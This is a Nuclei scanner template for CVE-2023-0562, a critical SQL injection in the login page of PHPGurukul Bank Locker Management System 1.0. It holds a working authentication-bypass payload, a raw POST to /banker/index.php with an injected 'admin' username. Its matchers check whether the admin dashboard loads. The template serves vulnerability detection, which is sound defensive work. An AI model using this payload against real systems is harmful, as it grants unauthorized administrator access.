id: CVE-2023-0562

info:
  name: Bank Locker Management System v1.0 - SQL Injection
  author: Harsh
  severity: critical
  description: |
    A vulnerability was found in PHPGurukul Bank Locker Management System 1.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file index.php of the component Login. The manipulation of the argument username leads to sql injection.
  remediation: |
    Upgrade to the latest version to mitigate this vulnerability.
  reference:
    - https://vuldb.com/?ctiid.219716
    - https://nvd.nist.gov/vuln/detail/CVE-2023-0562
    - https://vuldb.com/?id.219716
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-0562
    cwe-id: CWE-89
    epss-score: 0.02099
    epss-percentile: 0.87898
    cpe: cpe:2.3:a:phpgurukul:bank_locker_management_system:1.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: phpgurukul
    product: bank_locker_management_system
  tags: cve,cve2023,blms,sqli,bypass

http:
  - raw:
      - |
        POST /banker/index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin%27+AND+4719%3D4719--+GZHh&inputpwd=ABC&login=

    cookie-reuse: true
    redirects: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "admin")'
          - 'contains(body, "BLMS | Dashboard")'
        condition: and
# digest: 4a0a00473045022100c420e792af2cd3bd278fb65201118a98169a718dd44ee6a349a536030abe26e002202d25f0e255a1128e4534b00e51964a2223b8a8fd4659ac68003a9eee109284f7:922c64590222798bb761d5b6d8e72950